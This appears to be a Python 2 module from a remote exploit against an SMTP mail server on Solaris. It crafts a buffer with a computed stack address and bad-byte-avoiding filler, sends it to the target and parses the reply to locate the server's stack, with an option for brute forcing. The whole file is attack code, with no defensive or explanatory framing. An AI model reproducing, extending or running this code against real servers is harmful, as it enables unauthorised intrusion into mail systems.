import smtpUtils
import utils

class solaris:
   def buildStackLeakBuffer(self, target, stackBase):
      baseBuf = target.buildBaseBuffer(target.imtaBase)
      l7 = (stackBase + self.l7Stack) + target.l7Offset
      filler = utils.buildBuffer(4, target.badBytes)
      leakBuf = baseBuf \
                + utils.stringifyAddr(l7) \
                + filler		# filler is necessary in case we
					# get 0x20 as the last byte in l7
      return leakBuf

   def stackTouch(self, target, bruteForce=False):
      print "\nLooking for a %s stack:" % self.version
      stackBase = self.stackBase
      leakBuf = self.buildStackLeakBuffer(target, stackBase)
      target.startNewMsg()
      sd = target.sd
      smtpUtils.sendMsg(sd, leakBuf)
      try:
         reply = smtpUtils.recvReply(sd)
      except smtpUtils.smtpError, err:
         err.printMsg(" looking for a %s stack" % self.version)
         return 1
      if self.validReply(target, reply, stackBase):
         print "Found the stack at 0x%08x." % stackBase
         target.stackBase = stackBase
         return 0
      print "Target replied with:"
      utils.dumpHex(reply)
      return 1
